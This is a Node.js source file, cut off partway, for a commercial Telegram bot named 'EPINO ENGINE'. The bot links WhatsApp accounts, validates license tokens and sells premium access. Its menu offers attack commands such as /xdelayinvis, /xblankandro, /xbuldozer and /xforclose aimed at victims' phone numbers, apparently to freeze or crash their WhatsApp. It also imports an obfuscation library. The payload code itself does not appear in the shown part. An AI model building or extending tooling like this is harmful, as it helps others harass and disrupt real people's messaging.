const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require('@whiskeysockets/baileys');

// ---------- ( Set Const ) ----------- \\
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const sessions = new Map();
const readline = require('readline');
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const axios = require("axios");
const chalk = require("chalk"); 
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/epindev01/dbepino/refs/heads/main/token.json"; 
const ONLY_FILE = path.join(__dirname, "engine", "gconly.json");
const cd = path.join(__dirname, "engine", "cd.json");


///==== (Random Image) =====\\\
function getRandomImage() {
const images = [
"https://files.catbox.moe/mi89lv.jpg", 
"https://files.catbox.moe/mi89lv.jpg",
];
  return images[Math.floor(Math.random() * images.length)];
}
// ----------------- ( Pengecekan Token ) ------------------- \\
async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red(`
═══════════════════════════════════════════
( ! ) LU BELUM ADD TOKEN PANTEK
═══════════════════════════════════════════
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠹⣿⠿⡇⢀⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⠀⠀⠀⠀⠀⣄⢻⣦⣼⣶⢆⣀⣾⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠰⠀⠀⡀⠀⠀⠀⠀⠀⠙⢸⣿⣿⢟⣌⢿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠃⠀⠀⠰⠃⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣷⣮⠋⣾⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡿⠈⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⣄⡀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡿⢉⡇⠀⠀⠀⠀⠀⢰⠄⢷⣄⠀⡇⣦⢠⣤⣿⣃⠀⢸⣇⣀⠀⠀⠀⠀⠀⠀⠀⣿⡟⢿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣇⢘⡇⣇⠄⠀⠀⡀⠀⠁⠀⠐⠶⣿⣿⣾⣿⣿⠟⠀⠀⠉⢘⠀⠀⢀⡄⠀⠀⠀⣯⡜⢺⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡿⣿⣿⡏⢸⡄⠀⠠⣧⠀⠀⠀⣷⣿⣿⣿⣿⣿⣿⡄⠀⠀⣸⡇⠀⠸⣿⠀⠀⠀⣿⣿⡿⠿⣛⣛⣛⣻⡿⣿⣿
⣿⣿⡿⢠⡝⣿⣇⣧⡃⠀⠀⢻⣇⣠⣤⣿⣿⣿⣿⣿⣿⣿⣷⣦⣶⣿⡇⠀⠰⠋⠀⠀⠀⠹⣫⣶⣿⣿⣿⣿⣿⣿⣿⡻
⣿⣿⣿⣆⣸⣿⢸⣿⡇⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣥⣾⣿⠁⢰⡆⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡈⣿⡇⠀⠀⠀⠘⢿⣿⣿⣿⣿⠟⢻⣿⣿⣿⣿⡿⠁⠀⠀⠁⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡜⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣿⣿⣿⡿⠟⡉⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡇⢀⡆⠀⠀⠀⠀⠀⠀⡀⠉⠛⠛⠉⣠⣾⡇⡀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣹⣿⡘⣸⢸⠃⢰⠀⠀⠀⠀⡀⣷⣔⢶⣤⣾⠿⣫⣾⣷⢠⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣷⣡⣿⢃⠇⣾⠀⡼⠀⠀⢤⣾⠸⣿⣿⣷⡌⢵⣾⣿⣿⡟⡼⢰⣶⣄⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠿⠿⣿⣿⣿⡏⣾⠆⢟⣠⣶⣧⠣⡘⣿⡄⢿⣿⠟⠀⠈⢻⣿⠟⠸⠃⣾⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣧⡀⢿⣿⡿⣸⢏⣴⣿⣿⣿⣿⣷⣶⠈⡃⠢⢋⡄⠀⢀⣦⡋⢠⡴⣱⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣅⣂⣿⡇⢡⣿⣿⣿⣿⣿⣿⣿⣿⣧⢻⡐⣿⡏⠀⢸⣿⠡⣿⢣⣿⣿⣿⣿⣷⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⠇⣼⡞⠿⣛⣛⣟⣛⣛⡛⠻⠎⠷⠹⠀⠀⢸⢫⣿⢣⣾⣿⣿⣿⣿⣇⣌⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
`));
   process.exit(1);
   }
   console.log(chalk.green(` 💡-# Token Valid⠀⠀`));
  startBot();
  initializeWhatsAppConnections();
  }



function startBot() {
  console.log(chalk.red(`
═══════════════════════════════════════════
( ! ) OKEEE TOKEN KAMU TERVERIFIKASI 
═══════════════════════════════════════════
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⡸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣫⡶⣁⡣⡹⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⣵⣏⡺⠳⢻⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢏⣾⣿⢱⣿⣿⡆⢻⣭⣭⣭⣭⣭⣭⣭⣑⣻⣿⢸⣿⣧⠘⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣱⣿⣿⣿⡾⢿⠿⣫⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣮⣝⠇⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡟⡫⣰⣿⣿⣿⣿⣾⣾⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⡻⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡛⣡⢜⣴⣹⣿⣿⣿⣿⣿⢻⡏⣿⡨⣻⣿⣿⣿⣿⣿⣿⣿⣻⣿⣿⣷⡽⣿⣿⣿⣿⣎⢿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡿⢋⣴⣿⠯⠼⣿⢻⣿⣿⣿⣿⡏⣧⣷⢹⣧⢷⡝⣿⣦⢻⣿⣿⣿⣷⢱⢻⣿⣷⢹⡻⣿⣿⡟⡆⢻⣿
⣿⣿⣿⣿⣿⣿⡟⢡⣾⣿⢧⡹⢿⡏⣺⣛⣛⡻⣿⢳⢿⣿⠈⣿⢸⣿⡜⣿⡌⣿⡿⢿⠿⣦⠞⡿⣫⣄⢇⢹⡗⣶⣯⢁⢿
⣿⣿⣿⣿⣿⡟⢠⣿⣿⡏⣾⣿⣿⢹⣯⣾⣯⣵⡟⠘⠙⠌⡇⡿⢸⣿⣿⢩⠃⢹⣧⣧⣯⢻⠒⣵⡿⢹⡾⡆⣿⣿⣿⡇⡼
⣿⣿⣿⣿⣿⠱⣸⣿⣿⢱⣿⣿⡇⣾⣿⣿⣿⣿⡏⣾⠟⣰⠇⠁⠛⠿⡿⡿⢃⠘⣡⣠⡀⠈⠀⠀⢀⠙⠃⢱⣿⣿⣿⠇⢁
⣿⣿⣿⣿⣿⡄⣿⣿⡿⣼⣿⣿⢳⣿⣿⣿⣿⣿⡇⣫⠞⣩⡤⠶⢦⣄⣵⣷⣿⣿⣿⣿⣧⠆⠷⠀⠈⠻⣦⠸⣿⣹⡿⣸⣸
⣿⣿⣿⣿⣇⡇⣿⣿⡇⣿⣿⣿⣸⣿⣿⣿⣿⣿⡇⢡⣿⠻⠆⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⣻⡆⢿⣧⡌⢿⣿
⣿⣿⣿⣿⣿⣐⢹⣿⡇⣿⣿⡏⣿⣿⣿⣿⣿⣿⡇⢻⣿⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣆⡀⠀⠀⣠⣿⣾⣌⢿⣿⡜⣿
⣿⣿⣿⣿⣿⣧⠈⣿⣧⢿⣿⡇⣿⣿⣿⣿⣿⣿⡇⣮⣻⣧⣀⢀⣀⣤⣿⣿⣿⣿⣿⣿⣶⣿⣿⣿⣿⣫⣱⡻⡝⡌⣿⣷⢹
⣿⣿⣿⣿⣿⣿⣷⣜⢻⠸⣿⣇⣿⣿⣿⣿⣿⣿⣧⢸⡽⣝⡴⣜⠝⣿⡻⣿⠿⠿⠛⠛⡛⠛⢛⢫⣷⣱⣓⣙⣙⣽⢸⣿⡏
⣿⣿⣿⣿⣿⣿⣿⣿⣷⣇⢻⣿⢹⡿⣿⣿⣿⣿⣿⠘⣮⣾⣮⣮⣾⡿⠀⣀⣀⣦⣥⣒⣀⠁⠂⠄⣿⣿⣿⣿⣿⢏⣿⣿⡇
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢘⣿⡼⣇⣿⣿⣿⣿⣿⡞⣹⣿⣿⣿⣿⡇⣾⣿⣿⣿⣿⣿⣿⣿⣷⣀⣿⣿⣿⢟⣱⣿⣿⣿⡇
⣿⢿⣿⡿⣟⢛⣛⢛⠻⣿⢸⣿⣧⢿⣹⣿⣿⣿⣿⣧⢣⠻⣿⣿⣿⣿⣎⡻⠿⣿⠿⠿⣟⣛⣽⠾⡟⡫⣷⣿⣿⢻⡟⣶⠁
⣿⢀⣵⣯⣾⣿⢣⣾⣿⣿⢘⡿⠿⡎⣧⢿⣿⠟⡿⢱⡔⠑⠄⠉⠉⢻⣿⣿⣿⡿⡟⠋⠉⠑⢶⣿⡇⡇⣿⣿⣾⣶⣾⠏⢳
⢣⣿⣺⣽⣽⡁⣿⣿⣿⡿⣠⣇⣧⣿⡘⣜⣿⣵⣷⣿⣦⠀⠀⠀⠀⠀⠛⡿⢿⠿⠀⠀⠀⠀⢠⡹⠳⣳⢿⣿⣿⣿⢏⠆⣾
⢸⣿⣿⣿⣿⡇⢻⣿⣿⢇⣿⣿⡏⣿⣿⣜⢪⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠐⠶⠃⠀⠀⠀⠀⠸⡳⣜⢏⣿⣿⢟⣵⣿⣾⣿
`));
console.log(chalk.green(`
┌──────────────────────┐
│    EPINO ENGINE
└──────────────────────┘
Developer : epindev
Version : 1.0.0
`));
}
validateToken();


// --------------- ( Save Session & Installasion WhatsApp ) ------------------- \\

let sock;
function saveActiveSessions(botNumber) {
        try {
        const sessions = [];
        if (fs.existsSync(SESSIONS_FILE)) {
        const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
        if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
        }
        } else {
        sessions.push(botNumber);
        }
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
        } catch (error) {
        console.error("Error saving session:", error);
        }
        }

async function initializeWhatsAppConnections() {
          try {
                   if (fs.existsSync(SESSIONS_FILE)) {
                  const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
                  console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

                  for (const botNumber of activeNumbers) {
                  console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
                  const sessionDir = createSessionDir(botNumber);
                  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

                  sock = makeWASocket ({
                  auth: state,
                  printQRInTerminal: true,
                  logger: P({ level: "silent" }),
                  defaultQueryTimeoutMs: undefined,
                  });

                  await new Promise((resolve, reject) => {
                  sock.ev.on("connection.update", async (update) => {
                  const { connection, lastDisconnect } = update;
                  if (connection === "open") {
                  console.log(`Bot ${botNumber} terhubung!`);
                  sessions.set(botNumber, sock);
                  resolve();
                  } else if (connection === "close") {
                  const shouldReconnect =
                  lastDisconnect?.error?.output?.statusCode !==
                  DisconnectReason.loggedOut;
                  if (shouldReconnect) {
                  console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                  await initializeWhatsAppConnections();
                  } else {
                  reject(new Error("Koneksi ditutup"));
                  }
                  }
                  });

                  sock.ev.on("creds.update", saveCreds);
                  });
                  }
                }
             } catch (error) {
          console.error("Error initializing WhatsApp connections:", error);
           }
         }

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}
////=== Intalasi WhatsApp ===\\\
async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `
<blockquote>𝐄𝐏𝐈𝐍𝐎 𝐄𝐍𝐆𝐈𝐍𝐄</blockquote>
▢ Prepare the pairing code...
╰➤ Number : ${botNumber}
`,
      { parse_mode: "HTML" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket ({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `
<blockquote>𝐄𝐏𝐈𝐍𝐎 𝐄𝐍𝐆𝐈𝐍𝐄</blockquote>
▢ Prosess connecting
╰➤ Number : ${botNumber}
╰➤ Status : Connecting...
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
<blockquote>𝐄𝐏𝐈𝐍𝐎 𝐄𝐍𝐆𝐈𝐍𝐄</blockquote>
▢ Connection closed.
╰➤ Number : ${botNumber}
╰➤ Status : Failed ❌
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `
<blockquote>𝐄𝐏𝐈𝐍𝐎 𝐄𝐍𝐆𝐈𝐍𝐄</blockquote>
▢ Connection Success!
╰➤ Number : ${botNumber}
╰➤ Status : Success Connected
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "HTML",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
  const code = await sock.requestPairingCode(botNumber, "GACORWAK");
  const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

  await bot.editMessageText(
    `
<blockquote>𝐄𝐏𝐈𝐍𝐎 𝐄𝐍𝐆𝐈𝐍𝐄</blockquote>
▢ Your Code Pairing..
╰➤ Number : ${botNumber}
╰➤ Code : ${formattedCode}
`,
    {
      chat_id: chatId,
      message_id: statusMessage,
      parse_mode: "HTML",
  });
};
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
<blockquote>𝐄𝐏𝐈𝐍𝐎 𝐄𝐍𝐆𝐈𝐍𝐄</blockquote>
▢ Try again...
╰➤ Number : ${botNumber}
╰➤ Status : ${error.message} Error⚠️
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

///=== Function Cek id ch ===\\\
async function getWhatsAppChannelInfo(link) {
    if (!link.includes("https://whatsapp.com/channel/")) return { error: "Link tidak valid!" };
    
    let channelId = link.split("https://whatsapp.com/channel/")[1];
    try {
        let res = await sock.newsletterMetadata("invite", channelId);
        return {
            id: res.id,
            name: res.name,
            subscribers: res.subscribers,
            status: res.state,
            verified: res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"
        };
    } catch (err) {
        return { error: "Gagal mengambil data! Pastikan channel valid." };
    }
}

// ---------- ( Read File And Save Premium - Admin - Owner ) ----------- \\
            let premiumUsers = JSON.parse(fs.readFileSync('./engine/premium.json'));
            let adminUsers = JSON.parse(fs.readFileSync('./engine/admin.json'));

            function ensureFileExists(filePath, defaultData = []) {
            if (!fs.existsSync(filePath)) {
            fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
            }
            }
    
            ensureFileExists('./engine/premium.json');
            ensureFileExists('./engine/admin.json');


            function savePremiumUsers() {
            fs.writeFileSync('./engine/premium.json', JSON.stringify(premiumUsers, null, 2));
            }

            function saveAdminUsers() {
            fs.writeFileSync('./engine/admin.json', JSON.stringify(adminUsers, null, 2));
            }

    function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
    if (eventType === 'change') {
    try {
    const updatedData = JSON.parse(fs.readFileSync(filePath));
    updateCallback(updatedData);
    console.log(`File ${filePath} updated successfully.`);
    } catch (error) {
    console.error(`Error updating ${filePath}:`, error.message);
    }
    }
    });
    }

    watchFile('./engine/premium.json', (data) => (premiumUsers = data));
    watchFile('./engine/admin.json', (data) => (adminUsers = data));


   function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}
////==== Fungsi buat file otomatis ====\\\
if (!fs.existsSync(ONLY_FILE)) {
  fs.writeFileSync(ONLY_FILE, JSON.stringify({ groupOnly: false }, null, 2));
}

if (!fs.existsSync(cd)) {
  fs.writeFileSync(cd, JSON.stringify({ time: 0, users: {} }, null, 2));
}
// ------------ ( Function Plugins ) ------------- \\
function formatRuntime(seconds) {
        const days = Math.floor(seconds / (3600 * 24));
        const hours = Math.floor((seconds % (3600 * 24)) / 3600);
        const minutes = Math.floor((seconds % 3600) / 60);
        const secs = seconds % 60;  
        return `${hours}h, ${minutes}m, ${secs}s`;
        }

       const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
        const now = Math.floor(Date.now() / 1000);
        return formatRuntime(now - startTime);
        }

function getSpeed() {
        const startTime = process.hrtime();
        return getBotSpeed(startTime); 
}


function getCurrentDate() {
        const now = new Date();
        const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
         return now.toLocaleDateString("id-ID", options); // Format: Senin, 6 Maret 2025
}

        let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
        fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
        if (cooldownData.users[userId]) {
                const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
                if (remainingTime > 0) {
                        return Math.ceil(remainingTime / 1000); 
                }
        }
        cooldownData.users[userId] = Date.now();
        saveCooldown();
        setTimeout(() => {
                delete cooldownData.users[userId];
                saveCooldown();
        }, cooldownData.time);
        return 0;
}

function setCooldown(timeString) {
        const match = timeString.match(/(\d+)([smh])/);
        if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";

        let [_, value, unit] = match;
        value = parseInt(value);

        if (unit === "s") cooldownData.time = value * 1000;
        else if (unit === "m") cooldownData.time = value * 60 * 1000;
        else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

        saveCooldown();
        return `Cooldown diatur ke ${value}${unit}`;
}
///===== ( Menu Utama ) =====\\\
const bugRequests = {};

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const runtime = getBotRuntime();
  const randomImage = getRandomImage();
  const chatType = msg.chat.type;
  const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
  const isPremium = premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date());
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";

  if (!isPremium) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
<blockquote>PREMIUM ACCES</blockquote>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "BUY SCRIPT", url: "https://t.me/epindev", style: "primary" },
          ]
        ]
      }
    });
  }

  if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  const caption =
`<blockquote>𝐄𝐏𝐈𝐍𝐎 𝐄𝐍𝐆𝐈𝐍𝐄</blockquote>
◉ ᴅᴇᴠᴇʟᴏᴘᴇʀ › ᴇᴘɪɴᴅᴇᴠ
◉ ᴜsᴇʀ › ${username}
◉ ᴠᴇʀsɪᴏɴ › 1.0
◉ sᴛᴀᴛᴜs › ${isPremium ? "Premium" : "No Access"}
◉ ʀᴜɴᴛɪᴍᴇ › ${runtime}
<blockquote>𐚁 ᴘʟᴇᴀsᴇ ᴘʀᴇss ᴛʜᴇ ʙᴜᴛᴛᴏɴ</blockquote>
`;

 const buttons = [
  [
    { text: "𝐁͢𝐮͡𝐠⍣᳟𝐌͢𝐞͡𝐧͜𝐮꙳͙͡", callback_data: "bugshow", style: 'Primary', icon_custom_emoji_id: "5253649454401073265" },
  ],
  [
    { text: "𝐎͢𝐰͡𝐧͜𝐞͢𝐫 𝐌͢𝐞͡𝐧͜𝐮꙳͙͡", callback_data: "ownermenu", style: 'Success', icon_custom_emoji_id: "5296253249349762405" }
  ],
  [
    { text: "𝐂͢𝐡͡𝐚͜𝐧͢𝐧͡𝐞͜𝐥", url: "https://t.me/infoepin", style: 'Danger', icon_custom_emoji_id: "5228737694896502547" },
    { text: "𝐓͢𝐡͡𝐚͜𝐧͢𝐤⍣᳟𝐬꙳͙͡", callback_data: "thanksto", icon_custom_emoji_id: "5242409048246071737", style: "primary" },
    { text: "𝐃͢𝐞͡𝐯͜𝐞͢𝐥͡𝐨͜𝐩͢𝐞͡𝐫", url: "https://t.me/epindev", style: 'Danger', icon_custom_emoji_id: "5228737694896502547" }
  ]
];


  bot.sendPhoto(chatId, randomImage, {
    caption,
    parse_mode: "HTML",
    reply_markup: { inline_keyboard: buttons }
  });
});
bot.on("callback_query", async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const messageId = callbackQuery.message.message_id;
  const data = callbackQuery.data;
  const randomImage = getRandomImage();
  const senderId = callbackQuery.from.id;
  const isPremium = premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date());
  const username = callbackQuery.from.username ? `@${callbackQuery.from.username}` : "Tidak ada username";

  let newCaption = "";
  let newButtons = [];
// Handler bugmenu
  if (data === "bugshow") {
    newCaption =
`<blockquote> 𝗔𝗧𝗧𝗔𝗖𝗞 - 𝗠 𝗘 𝗡 𝗨</blockquote>
▣ /xdelayinvis 62xxx
<blockquote> 𝗕 𝗟 𝗔 𝗡 𝗞</blockquote>
▣ /xblankandro 62xxx
<blockquote> 𝗕 𝗨 𝗟 𝗗 𝗢 𝗭 𝗘 𝗥</blockquote>
▣ /xbuldozer 62xxx
<blockquote> 𝗙 𝗢 𝗥 𝗖 𝗟 𝗢 𝗦 𝗘</blockquote>
▣ /xforclose 62xxx
`;

    newButtons = [
      [{ text: "ʙᴀᴄᴋ", callback_data: "mainmenu", style: "danger" }]
    ];
  } else if (data === "ownermenu") {
    newCaption =
`<blockquote>𝗔 𝗖 𝗖 𝗘 𝗦 - 𝗠 𝗘 𝗡 𝗨</blockquote>
⚊▣ /addprem 
  ☇ Input ID
⚊▣ /delprem
  ☇ Input ID  
⚊▣ /addadmin
  ☇ Input ID  
⚊▣ /deladmin 
  ☇ Input ID
⚊▣ /listprem 
  ☇ See prem  
⚊▣ /setjeda 
  ☇ s (detik)
  ☇ m (menit)
⚊▣ /xpairing 
  ☇ 62xx  
⚊▣ /gconly
  ☇ on/off
`;

    newButtons = [
      [{ text: "ʙᴀᴄᴋ", callback_data: "mainmenu", style: "danger" }]
    ];
// Handler tqto
  } else if (data === "thanksto") {
    newCaption =
`<blockquote>𝗧 𝗛 𝗔 𝗡 𝗞 𝗦 - 𝗧 𝗢</blockquote>
⚊▣ @epindev ( Developer) 
⚊▣ @username ( My Friend )
⚊▣ @username ( Best Friend )
⚊▣ @username ( Best Friend )
⚊▣ ᴀʟʟ ʙᴜʏᴇʀ ᴇᴘɪɴᴏ ᴇɴɢɪɴᴇ

`;

    newButtons = [
      [{ text: "ʙᴀᴄᴋ", callback_data: "mainmenu", style: "danger" }]
    ];
// Handler back main
  } else if (data === "mainmenu") {
    const runtime = getBotRuntime();
    newCaption =
`<blockquote>𝐄𝐏𝐈𝐍𝐎 𝐄𝐍𝐆𝐈𝐍𝐄</blockquote>
◉ ᴅᴇᴠᴇʟᴏᴘᴇʀ › ᴇᴘɪɴᴅᴇᴠ
◉ ᴜsᴇʀ › ${username}
◉ ᴠᴇʀsɪᴏɴ › 1.0
◉ sᴛᴀᴛᴜs › ${isPremium ? "Premium" : "No Access"}
◉ ʀᴜɴᴛɪᴍᴇ › ${runtime}
<blockquote>𐚁 ᴘʟᴇᴀsᴇ ᴘʀᴇss ᴛʜᴇ ʙᴜᴛᴛᴏɴ</blockquote>
`;

    newButtons = [
  [
    { text: "𝐁͢𝐮͡𝐠⍣᳟𝐌͢𝐞͡𝐧͜𝐮꙳͙͡", callback_data: "bugshow", style: 'Primary', icon_custom_emoji_id: "5253649454401073265" },
  ],
  [
